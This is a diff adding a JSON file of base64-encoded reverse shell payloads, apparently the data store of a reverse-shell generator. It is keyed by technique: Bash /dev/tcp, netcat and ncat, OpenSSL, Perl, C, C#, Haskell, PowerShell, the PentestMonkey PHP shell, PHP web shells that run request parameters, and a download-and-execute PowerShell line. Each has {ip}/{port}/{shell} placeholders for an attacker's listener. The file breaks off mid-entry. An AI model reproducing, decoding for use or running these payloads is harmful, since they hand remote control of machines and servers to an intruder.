@@ -1,0 +1,473 @@
+{
+    "Bash -i": {
+        "command": "e3NoZWxsfSAtaSA+JiAvZGV2L3RjcC97aXB9L3twb3J0fSAwPiYx",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "Bash 196": {
+        "command": "MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC97aXB9L3twb3J0fTsge3NoZWxsfSA8JjE5NiA+JjE5NiAyPiYxOTY=",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "Bash read line": {
+        "command": "ZXhlYyA1PD4vZGV2L3RjcC97aXB9L3twb3J0fTtjYXQgPCY1IHwgd2hpbGUgcmVhZCBsaW5lOyBkbyAkbGluZSAyPiY1ID4mNTsgZG9uZQ==",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "Bash 5": {
+        "command": "e3NoZWxsfSAtaSA1PD4gL2Rldi90Y3Ave2lwfS97cG9ydH0gMDwmNSAxPiY1IDI+JjU=",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "Bash udp": {
+        "command": "e3NoZWxsfSAtaSA+JiAvZGV2L3VkcC97aXB9L3twb3J0fSAwPiYx",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "ssl mkfifo": {
+        "command": "bWtmaWZvIGZpZm87IHtzaGVsbH0gLWkgPCBmaWZvIDI+JjEgfCBvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCB7aXB9Ontwb3J0fSA+IGZpZm87IHJtIGZpZm8=",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "nc mkfifo": {
+        "command": "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnx7c2hlbGx9IC1pIDI+JjF8bmMge2lwfSB7cG9ydH0gPi90bXAvZg==",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "nc -e": {
+        "command": "bmMge2lwfSB7cG9ydH0gLWUge3NoZWxsfQ==",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "nc.exe -e": {
+        "command": "bmMuZXhlIHtpcH0ge3BvcnR9IC1lIHtzaGVsbH0=",
+        "meta": [
+            "windows"
+        ]
+    },
+    "BusyBox nc -e": {
+        "command": "YnVzeWJveCBuYyB7aXB9IHtwb3J0fSAtZSB7c2hlbGx9",
+        "meta": [
+            "linux"
+        ]
+    },
+    "nc -c": {
+        "command": "bmMgLWMge3NoZWxsfSB7aXB9IHtwb3J0fQ==",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "ncat -e": {
+        "command": "bmNhdCB7aXB9IHtwb3J0fSAtZSB7c2hlbGx9",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "ncat.exe -e": {
+        "command": "bmNhdC5leGUge2lwfSB7cG9ydH0gLWUge3NoZWxsfQ==",
+        "meta": [
+            "windows"
+        ]
+    },
+    "ncat udp": {
+        "command": "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnx7c2hlbGx9IC1pIDI+JjF8bmNhdCAtdSB7aXB9IHtwb3J0fSA+L3RtcC9m",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "rustcat": {
+        "command": "cmNhdCBjb25uZWN0IC1zIHtzaGVsbH0ge2lwfSB7cG9ydH0=",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "C": {
+        "command": "I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+CiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgojaW5jbHVkZSA8dW5pc3RkLmg+CiNpbmNsdWRlIDxuZXRpbmV0L2luLmg+CiNpbmNsdWRlIDxhcnBhL2luZXQuaD4KCmludCBtYWluKHZvaWQpewogICAgaW50IHBvcnQgPSB7cG9ydH07CiAgICBzdHJ1Y3Qgc29ja2FkZHJfaW4gcmV2c29ja2FkZHI7CgogICAgaW50IHNvY2t0ID0gc29ja2V0KEFGX0lORVQsIFNPQ0tfU1RSRUFNLCAwKTsKICAgIHJldnNvY2thZGRyLnNpbl9mYW1pbHkgPSBBRl9JTkVUOyAgICAgICAKICAgIHJldnNvY2thZGRyLnNpbl9wb3J0ID0gaHRvbnMocG9ydCk7CiAgICByZXZzb2NrYWRkci5zaW5fYWRkci5zX2FkZHIgPSBpbmV0X2FkZHIoIntpcH0iKTsKCiAgICBjb25uZWN0KHNvY2t0LCAoc3RydWN0IHNvY2thZGRyICopICZyZXZzb2NrYWRkciwgCiAgICBzaXplb2YocmV2c29ja2FkZHIpKTsKICAgIGR1cDIoc29ja3QsIDApOwogICAgZHVwMihzb2NrdCwgMSk7CiAgICBkdXAyKHNvY2t0LCAyKTsKCiAgICBjaGFyICogY29uc3QgYXJndltdID0geyJ7c2hlbGx9IiwgTlVMTH07CiAgICBleGVjdmUoIntzaGVsbH0iLCBhcmd2LCBOVUxMKTsKCiAgICByZXR1cm4gMDsgICAgICAgCn0=",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "C Windows": {
+        "command": "I2luY2x1ZGUgPHdpbnNvY2syLmg+DQojaW5jbHVkZSA8c3RkaW8uaD4NCiNwcmFnbWEgY29tbWVudChsaWIsIndzMl8zMiIpDQoNCldTQURBVEEgd3NhRGF0YTsNClNPQ0tFVCBXaW5zb2NrOw0Kc3RydWN0IHNvY2thZGRyX2luIGhheDsgDQpjaGFyIGlwX2FkZHJbMTZdID0gIntpcH0iOyANCmNoYXIgcG9ydFs2XSA9ICJ7cG9ydH0iOyAgICAgICAgICAgIA0KDQpTVEFSVFVQSU5GTyBpbmlfcHJvY2Vzc287DQoNClBST0NFU1NfSU5GT1JNQVRJT04gcHJvY2Vzc29faW5mbzsNCg0KaW50IG1haW4oKQ0Kew0KICAgIFdTQVN0YXJ0dXAoTUFLRVdPUkQoMiwgMiksICZ3c2FEYXRhKTsNCiAgICBXaW5zb2NrID0gV1NBU29ja2V0KEFGX0lORVQsIFNPQ0tfU1RSRUFNLCBJUFBST1RPX1RDUCwgTlVMTCwgKHVuc2lnbmVkIGludClOVUxMLCAodW5zaWduZWQgaW50KU5VTEwpOw0KDQoNCiAgICBzdHJ1Y3QgaG9zdGVudCAqaG9zdDsgDQogICAgaG9zdCA9IGdldGhvc3RieW5hbWUoaXBfYWRkcik7DQogICAgc3RyY3B5X3MoaXBfYWRkciwgaW5ldF9udG9hKCooKHN0cnVjdCBpbl9hZGRyICopaG9zdC0+aF9hZGRyKSkpOw0KDQogICAgaGF4LnNpbl9mYW1pbHkgPSBBRl9JTkVUOw0KICAgIGhheC5zaW5fcG9ydCA9IGh0b25zKGF0b2kocG9ydCkpOw0KICAgIGhheC5zaW5fYWRkci5zX2FkZHIgPSBpbmV0X2FkZHIoaXBfYWRkcik7DQoNCiAgICBXU0FDb25uZWN0KFdpbnNvY2ssIChTT0NLQUREUiopJmhheCwgc2l6ZW9mKGhheCksIE5VTEwsIE5VTEwsIE5VTEwsIE5VTEwpOw0KDQogICAgbWVtc2V0KCZpbmlfcHJvY2Vzc28sIDAsIHNpemVvZihpbmlfcHJvY2Vzc28pKTsNCiAgICBpbmlfcHJvY2Vzc28uY2IgPSBzaXplb2YoaW5pX3Byb2Nlc3NvKTsNCiAgICBpbmlfcHJvY2Vzc28uZHdGbGFncyA9IFNUQVJURl9VU0VTVERIQU5ETEVTIHwgU1RBUlRGX1VTRVNIT1dXSU5ET1c7IA0KICAgIGluaV9wcm9jZXNzby5oU3RkSW5wdXQgPSBpbmlfcHJvY2Vzc28uaFN0ZE91dHB1dCA9IGluaV9wcm9jZXNzby5oU3RkRXJyb3IgPSAoSEFORExFKVdpbnNvY2s7DQoNCiAgICBUQ0hBUiBjbWRbMjU1XSA9IFRFWFQoImNtZC5leGUiKTsNCg0KICAgIENyZWF0ZVByb2Nlc3MoTlVMTCwgY21kLCBOVUxMLCBOVUxMLCBUUlVFLCAwLCBOVUxMLCBOVUxMLCAmaW5pX3Byb2Nlc3NvLCAmcHJvY2Vzc29faW5mbyk7DQoNCiAgICByZXR1cm4gMDsNCn0=",
+        "meta": [
+            "windows"
+        ]
+    },
+    "C# TCP Client": {
+        "command": "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uVGV4dDsKdXNpbmcgU3lzdGVtLklPOwp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7CnVzaW5nIFN5c3RlbS5Db21wb25lbnRNb2RlbDsKdXNpbmcgU3lzdGVtLkxpbnE7CnVzaW5nIFN5c3RlbS5OZXQ7CnVzaW5nIFN5c3RlbS5OZXQuU29ja2V0czsKCgpuYW1lc3BhY2UgQ29ubmVjdEJhY2sKewoJcHVibGljIGNsYXNzIFByb2dyYW0KCXsKCQlzdGF0aWMgU3RyZWFtV3JpdGVyIHN0cmVhbVdyaXRlcjsKCgkJcHVibGljIHN0YXRpYyB2b2lkIE1haW4oc3RyaW5nW10gYXJncykKCQl7CgkJCXVzaW5nKFRjcENsaWVudCBjbGllbnQgPSBuZXcgVGNwQ2xpZW50KCJ7aXB9Iiwge3BvcnR9KSkKCQkJewoJCQkJdXNpbmcoU3RyZWFtIHN0cmVhbSA9IGNsaWVudC5HZXRTdHJlYW0oKSkKCQkJCXsKCQkJCQl1c2luZyhTdHJlYW1SZWFkZXIgcmRyID0gbmV3IFN0cmVhbVJlYWRlcihzdHJlYW0pKQoJCQkJCXsKCQkJCQkJc3RyZWFtV3JpdGVyID0gbmV3IFN0cmVhbVdyaXRlcihzdHJlYW0pOwoJCQkJCQkKCQkJCQkJU3RyaW5nQnVpbGRlciBzdHJJbnB1dCA9IG5ldyBTdHJpbmdCdWlsZGVyKCk7CgoJCQkJCQlQcm9jZXNzIHAgPSBuZXcgUHJvY2VzcygpOwoJCQkJCQlwLlN0YXJ0SW5mby5GaWxlTmFtZSA9ICJ7c2hlbGx9IjsKCQkJCQkJcC5TdGFydEluZm8uQ3JlYXRlTm9XaW5kb3cgPSB0cnVlOwoJCQkJCQlwLlN0YXJ0SW5mby5Vc2VTaGVsbEV4ZWN1dGUgPSBmYWxzZTsKCQkJCQkJcC5TdGFydEluZm8uUmVkaXJlY3RTdGFuZGFyZE91dHB1dCA9IHRydWU7CgkJCQkJCXAuU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRJbnB1dCA9IHRydWU7CgkJCQkJCXAuU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRFcnJvciA9IHRydWU7CgkJCQkJCXAuT3V0cHV0RGF0YVJlY2VpdmVkICs9IG5ldyBEYXRhUmVjZWl2ZWRFdmVudEhhbmRsZXIoQ21kT3V0cHV0RGF0YUhhbmRsZXIpOwoJCQkJCQlwLlN0YXJ0KCk7CgkJCQkJCXAuQmVnaW5PdXRwdXRSZWFkTGluZSgpOwoKCQkJCQkJd2hpbGUodHJ1ZSkKCQkJCQkJewoJCQkJCQkJc3RySW5wdXQuQXBwZW5kKHJkci5SZWFkTGluZSgpKTsKCQkJCQkJCS8vc3RySW5wdXQuQXBwZW5kKCJcbiIpOwoJCQkJCQkJcC5TdGFuZGFyZElucHV0LldyaXRlTGluZShzdHJJbnB1dCk7CgkJCQkJCQlzdHJJbnB1dC5SZW1vdmUoMCwgc3RySW5wdXQuTGVuZ3RoKTsKCQkJCQkJfQoJCQkJCX0KCQkJCX0KCQkJfQoJCX0KCgkJcHJpdmF0ZSBzdGF0aWMgdm9pZCBDbWRPdXRwdXREYXRhSGFuZGxlcihvYmplY3Qgc2VuZGluZ1Byb2Nlc3MsIERhdGFSZWNlaXZlZEV2ZW50QXJncyBvdXRMaW5lKQogICAgICAgIHsKICAgICAgICAgICAgU3RyaW5nQnVpbGRlciBzdHJPdXRwdXQgPSBuZXcgU3RyaW5nQnVpbGRlcigpOwoKICAgICAgICAgICAgaWYgKCFTdHJpbmcuSXNOdWxsT3JFbXB0eShvdXRMaW5lLkRhdGEpKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICB0cnkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBzdHJPdXRwdXQuQXBwZW5kKG91dExpbmUuRGF0YSk7CiAgICAgICAgICAgICAgICAgICAgc3RyZWFtV3JpdGVyLldyaXRlTGluZShzdHJPdXRwdXQpOwogICAgICAgICAgICAgICAgICAgIHN0cmVhbVdyaXRlci5GbHVzaCgpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBlcnIpIHsgfQogICAgICAgICAgICB9CiAgICAgICAgfQoKCX0KfQ==",
+        "meta": [
+            "linux",
+            "windows"
+        ]
+    },
+    "C# Bash -i": {
+        "command": "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7CgpuYW1lc3BhY2UgQmFja0Nvbm5lY3QgewogIGNsYXNzIFJldmVyc2VCYXNoIHsKCXB1YmxpYyBzdGF0aWMgdm9pZCBNYWluKHN0cmluZ1tdIGFyZ3MpIHsKCSAgUHJvY2VzcyBwcm9jID0gbmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzKCk7CgkgIHByb2MuU3RhcnRJbmZvLkZpbGVOYW1lID0gIntzaGVsbH0iOwoJICBwcm9jLlN0YXJ0SW5mby5Bcmd1bWVudHMgPSAiLWMgXCJ7c2hlbGx9IC1pID4mIC9kZXYvdGNwL3tpcH0ve3BvcnR9IDA+JjFcIiI7CgkgIHByb2MuU3RhcnRJbmZvLlVzZVNoZWxsRXhlY3V0ZSA9IGZhbHNlOwoJICBwcm9jLlN0YXJ0SW5mby5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0ID0gdHJ1ZTsKCSAgcHJvYy5TdGFydCgpOwoKCSAgd2hpbGUgKCFwcm9jLlN0YW5kYXJkT3V0cHV0LkVuZE9mU3RyZWFtKSB7CgkJQ29uc29sZS5Xcml0ZUxpbmUocHJvYy5TdGFuZGFyZE91dHB1dC5SZWFkTGluZSgpKTsKCSAgfQoJfQogIH0KfQo=",
+        "meta": [
+            "linux",
+            "windows"
+        ]
+    },
+    "Haskell #1": {
+        "command": "bW9kdWxlIE1haW4gd2hlcmUKCmltcG9ydCBTeXN0ZW0uUHJvY2VzcwoKbWFpbiA9IGNhbGxDb21tYW5kICJybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mIHwge3NoZWxsfSAtaSAyPiYxIHwgbmMge2lwfSB7cG9ydH0gPi90bXAvZiI=",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "Perl": {
+        "command": "cGVybCAtZSAndXNlIFNvY2tldDskaT0ie2lwfSI7JHA9e3BvcnR9O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIntzaGVsbH0gLWkiKTt9Oyc=",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "Perl no sh": {
+        "command": "cGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApOyRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCJ7aXB9Ontwb3J0fSIpO1NURElOLT5mZG9wZW4oJGMscik7JH4tPmZkb3BlbigkYyx3KTtzeXN0ZW0kXyB3aGlsZTw+Oyc=",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "PHP PentestMonkey": {
+        "command": "PD9waHAKLy8gcGhwLXJldmVyc2Utc2hlbGwgLSBBIFJldmVyc2UgU2hlbGwgaW1wbGVtZW50YXRpb24gaW4gUEhQLiBDb21tZW50cyBzdHJpcHBlZCB0byBzbGltIGl0IGRvd24uIFJFOiBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcGVudGVzdG1vbmtleS9waHAtcmV2ZXJzZS1zaGVsbC9tYXN0ZXIvcGhwLXJldmVyc2Utc2hlbGwucGhwCi8vIENvcHlyaWdodCAoQykgMjAwNyBwZW50ZXN0bW9ua2V5QHBlbnRlc3Rtb25rZXkubmV0CgpzZXRfdGltZV9saW1pdCAoMCk7CiRWRVJTSU9OID0gIjEuMCI7CiRpcCA9ICd7aXB9JzsKJHBvcnQgPSB7cG9ydH07CiRjaHVua19zaXplID0gMTQwMDsKJHdyaXRlX2EgPSBudWxsOwokZXJyb3JfYSA9IG51bGw7CiRzaGVsbCA9ICd1bmFtZSAtYTsgdzsgaWQ7IHtzaGVsbH0gLWknOwokZGFlbW9uID0gMDsKJGRlYnVnID0gMDsKCmlmIChmdW5jdGlvbl9leGlzdHMoJ3BjbnRsX2ZvcmsnKSkgewoJJHBpZCA9IHBjbnRsX2ZvcmsoKTsKCQoJaWYgKCRwaWQgPT0gLTEpIHsKCQlwcmludGl0KCJFUlJPUjogQ2FuJ3QgZm9yayIpOwoJCWV4aXQoMSk7Cgl9CgkKCWlmICgkcGlkKSB7CgkJZXhpdCgwKTsgIC8vIFBhcmVudCBleGl0cwoJfQoJaWYgKHBvc2l4X3NldHNpZCgpID09IC0xKSB7CgkJcHJpbnRpdCgiRXJyb3I6IENhbid0IHNldHNpZCgpIik7CgkJZXhpdCgxKTsKCX0KCgkkZGFlbW9uID0gMTsKfSBlbHNlIHsKCXByaW50aXQoIldBUk5JTkc6IEZhaWxlZCB0byBkYWVtb25pc2UuICBUaGlzIGlzIHF1aXRlIGNvbW1vbiBhbmQgbm90IGZhdGFsLiIpOwp9CgpjaGRpcigiLyIpOwoKdW1hc2soMCk7CgovLyBPcGVuIHJldmVyc2UgY29ubmVjdGlvbgokc29jayA9IGZzb2Nrb3BlbigkaXAsICRwb3J0LCAkZXJybm8sICRlcnJzdHIsIDMwKTsKaWYgKCEkc29jaykgewoJcHJpbnRpdCgiJGVycnN0ciAoJGVycm5vKSIpOwoJZXhpdCgxKTsKfQoKJGRlc2NyaXB0b3JzcGVjID0gYXJyYXkoCiAgIDAgPT4gYXJyYXkoInBpcGUiLCAiciIpLCAgLy8gc3RkaW4gaXMgYSBwaXBlIHRoYXQgdGhlIGNoaWxkIHdpbGwgcmVhZCBmcm9tCiAgIDEgPT4gYXJyYXkoInBpcGUiLCAidyIpLCAgLy8gc3Rkb3V0IGlzIGEgcGlwZSB0aGF0IHRoZSBjaGlsZCB3aWxsIHdyaXRlIHRvCiAgIDIgPT4gYXJyYXkoInBpcGUiLCAidyIpICAgLy8gc3RkZXJyIGlzIGEgcGlwZSB0aGF0IHRoZSBjaGlsZCB3aWxsIHdyaXRlIHRvCik7CgokcHJvY2VzcyA9IHByb2Nfb3Blbigkc2hlbGwsICRkZXNjcmlwdG9yc3BlYywgJHBpcGVzKTsKCmlmICghaXNfcmVzb3VyY2UoJHByb2Nlc3MpKSB7CglwcmludGl0KCJFUlJPUjogQ2FuJ3Qgc3Bhd24gc2hlbGwiKTsKCWV4aXQoMSk7Cn0KCnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzBdLCAwKTsKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMV0sIDApOwpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1syXSwgMCk7CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHNvY2ssIDApOwoKcHJpbnRpdCgiU3VjY2Vzc2Z1bGx5IG9wZW5lZCByZXZlcnNlIHNoZWxsIHRvICRpcDokcG9ydCIpOwoKd2hpbGUgKDEpIHsKCWlmIChmZW9mKCRzb2NrKSkgewoJCXByaW50aXQoIkVSUk9SOiBTaGVsbCBjb25uZWN0aW9uIHRlcm1pbmF0ZWQiKTsKCQlicmVhazsKCX0KCglpZiAoZmVvZigkcGlwZXNbMV0pKSB7CgkJcHJpbnRpdCgiRVJST1I6IFNoZWxsIHByb2Nlc3MgdGVybWluYXRlZCIpOwoJCWJyZWFrOwoJfQoKCSRyZWFkX2EgPSBhcnJheSgkc29jaywgJHBpcGVzWzFdLCAkcGlwZXNbMl0pOwoJJG51bV9jaGFuZ2VkX3NvY2tldHMgPSBzdHJlYW1fc2VsZWN0KCRyZWFkX2EsICR3cml0ZV9hLCAkZXJyb3JfYSwgbnVsbCk7CgoJaWYgKGluX2FycmF5KCRzb2NrLCAkcmVhZF9hKSkgewoJCWlmICgkZGVidWcpIHByaW50aXQoIlNPQ0sgUkVBRCIpOwoJCSRpbnB1dCA9IGZyZWFkKCRzb2NrLCAkY2h1bmtfc2l6ZSk7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU09DSzogJGlucHV0Iik7CgkJZndyaXRlKCRwaXBlc1swXSwgJGlucHV0KTsKCX0KCglpZiAoaW5fYXJyYXkoJHBpcGVzWzFdLCAkcmVhZF9hKSkgewoJCWlmICgkZGVidWcpIHByaW50aXQoIlNURE9VVCBSRUFEIik7CgkJJGlucHV0ID0gZnJlYWQoJHBpcGVzWzFdLCAkY2h1bmtfc2l6ZSk7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RET1VUOiAkaW5wdXQiKTsKCQlmd3JpdGUoJHNvY2ssICRpbnB1dCk7Cgl9CgoJaWYgKGluX2FycmF5KCRwaXBlc1syXSwgJHJlYWRfYSkpIHsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERFUlIgUkVBRCIpOwoJCSRpbnB1dCA9IGZyZWFkKCRwaXBlc1syXSwgJGNodW5rX3NpemUpOwoJCWlmICgkZGVidWcpIHByaW50aXQoIlNUREVSUjogJGlucHV0Iik7CgkJZndyaXRlKCRzb2NrLCAkaW5wdXQpOwoJfQp9CgpmY2xvc2UoJHNvY2spOwpmY2xvc2UoJHBpcGVzWzBdKTsKZmNsb3NlKCRwaXBlc1sxXSk7CmZjbG9zZSgkcGlwZXNbMl0pOwpwcm9jX2Nsb3NlKCRwcm9jZXNzKTsKCmZ1bmN0aW9uIHByaW50aXQgKCRzdHJpbmcpIHsKCWlmICghJGRhZW1vbikgewoJCXByaW50ICIkc3RyaW5nXG4iOwoJfQp9Cgo/Pg==",
+        "meta": [
+            "linux",
+            "windows",
+            "mac"
+        ]
+    },
+    "PHP cmd 2": {
+        "command": "PD9waHAgaWYoaXNzZXQoJF9SRVFVRVNUWyJjbWQiXSkpeyBlY2hvICI8cHJlPiI7ICRjbWQgPSAoJF9SRVFVRVNUWyJjbWQiXSk7IHN5c3RlbSgkY21kKTsgZWNobyAiPC9wcmU+IjsgZGllOyB9Pz4=",
+        "meta": [
+            "linux",
+            "windows",
+            "mac"
+        ]
+    },
+    "PHP cmd small": {
+        "command": "PD89YCRfR0VUWzBdYD8+",
+        "meta": [
+            "linux",
+            "windows",
+            "mac"
+        ]
+    },
+    "PHP exec": {
+        "command": "cGhwIC1yICckc29jaz1mc29ja29wZW4oIntpcH0iLHtwb3J0fSk7ZXhlYygie3NoZWxsfSA8JjMgPiYzIDI+JjMiKTsn",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "PHP shell_exec": {
+        "command": "cGhwIC1yICckc29jaz1mc29ja29wZW4oIntpcH0iLHtwb3J0fSk7c2hlbGxfZXhlYygie3NoZWxsfSA8JjMgPiYzIDI+JjMiKTsn",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "PHP system": {
+        "command": "cGhwIC1yICckc29jaz1mc29ja29wZW4oIntpcH0iLHtwb3J0fSk7c3lzdGVtKCJ7c2hlbGx9IDwmMyA+JjMgMj4mMyIpOyc=",
+        "meta": [
+            "linux",
+            "windows",
+            "mac"
+        ]
+    },
+    "PHP passthru": {
+        "command": "cGhwIC1yICckc29jaz1mc29ja29wZW4oIntpcH0iLHtwb3J0fSk7cGFzc3RocnUoIntzaGVsbH0gPCYzID4mMyAyPiYzIik7Jw==",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "PHP `": {
+        "command": "cGhwIC1yICckc29jaz1mc29ja29wZW4oIntpcH0iLHtwb3J0fSk7YHtzaGVsbH0gPCYzID4mMyAyPiYzYDsn",
+        "meta": [
+            "linux",
+            "windows",
+            "mac"
+        ]
+    },
+    "PHP popen": {
+        "command": "cGhwIC1yICckc29jaz1mc29ja29wZW4oIntpcH0iLHtwb3J0fSk7cG9wZW4oIntzaGVsbH0gPCYzID4mMyAyPiYzIiwgInIiKTsn",
+        "meta": [
+            "linux",
+            "windows",
+            "mac"
+        ]
+    },
+    "PHP proc_open": {
+        "command": "cGhwIC1yICckc29jaz1mc29ja29wZW4oIntpcH0iLHtwb3J0fSk7JHByb2M9cHJvY19vcGVuKCJ7c2hlbGx9IiwgYXJyYXkoMD0+JHNvY2ssIDE9PiRzb2NrLCAyPT4kc29jayksJHBpcGVzKTsn",
+        "meta": [
+            "linux",
+            "windows",
+            "mac"
+        ]
+    },
+    "Windows ConPty": {
+        "command": "SUVYKElXUiBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYW50b25pb0NvY28vQ29uUHR5U2hlbGwvbWFzdGVyL0ludm9rZS1Db25QdHlTaGVsbC5wczEgLVVzZUJhc2ljUGFyc2luZyk7IEludm9rZS1Db25QdHlTaGVsbCB7aXB9IHtwb3J0fQ==",
+        "meta": [
+            "windows"
+        ]
+    },
+    "PowerShell #1": {
+        "command": "JExIT1NUID0gIntpcH0iOyAkTFBPUlQgPSB7cG9ydH07ICRUQ1BDbGllbnQgPSBOZXctT2JqZWN0IE5ldC5Tb2NrZXRzLlRDUENsaWVudCgkTEhPU1QsICRMUE9SVCk7ICROZXR3b3JrU3RyZWFtID0gJFRDUENsaWVudC5HZXRTdHJlYW0oKTsgJFN0cmVhbVJlYWRlciA9IE5ldy1PYmplY3QgSU8uU3RyZWFtUmVhZGVyKCROZXR3b3JrU3RyZWFtKTsgJFN0cmVhbVdyaXRlciA9IE5ldy1PYmplY3QgSU8uU3RyZWFtV3JpdGVyKCROZXR3b3JrU3RyZWFtKTsgJFN0cmVhbVdyaXRlci5BdXRvRmx1c2ggPSAkdHJ1ZTsgJEJ1ZmZlciA9IE5ldy1PYmplY3QgU3lzdGVtLkJ5dGVbXSAxMDI0OyB3aGlsZSAoJFRDUENsaWVudC5Db25uZWN0ZWQpIHsgd2hpbGUgKCROZXR3b3JrU3RyZWFtLkRhdGFBdmFpbGFibGUpIHsgJFJhd0RhdGEgPSAkTmV0d29ya1N0cmVhbS5SZWFkKCRCdWZmZXIsIDAsICRCdWZmZXIuTGVuZ3RoKTsgJENvZGUgPSAoW3RleHQuZW5jb2RpbmddOjpVVEY4KS5HZXRTdHJpbmcoJEJ1ZmZlciwgMCwgJFJhd0RhdGEgLTEpIH07IGlmICgkVENQQ2xpZW50LkNvbm5lY3RlZCAtYW5kICRDb2RlLkxlbmd0aCAtZ3QgMSkgeyAkT3V0cHV0ID0gdHJ5IHsgSW52b2tlLUV4cHJlc3Npb24gKCRDb2RlKSAyPiYxIH0gY2F0Y2ggeyAkXyB9OyAkU3RyZWFtV3JpdGVyLldyaXRlKCIkT3V0cHV0YG4iKTsgJENvZGUgPSAkbnVsbCB9IH07ICRUQ1BDbGllbnQuQ2xvc2UoKTsgJE5ldHdvcmtTdHJlYW0uQ2xvc2UoKTsgJFN0cmVhbVJlYWRlci5DbG9zZSgpOyAkU3RyZWFtV3JpdGVyLkNsb3NlKCk=",
+        "meta": [
+            "windows"
+        ]
+    },
+    "PowerShell #2": {
+        "command": "cG93ZXJzaGVsbCAtbm9wIC1jICIkY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCd7aXB9Jyx7cG9ydH0pOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc+ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCki",
+        "meta": [
+            "windows"
+        ]
+    },
+    "PowerShell #3": {
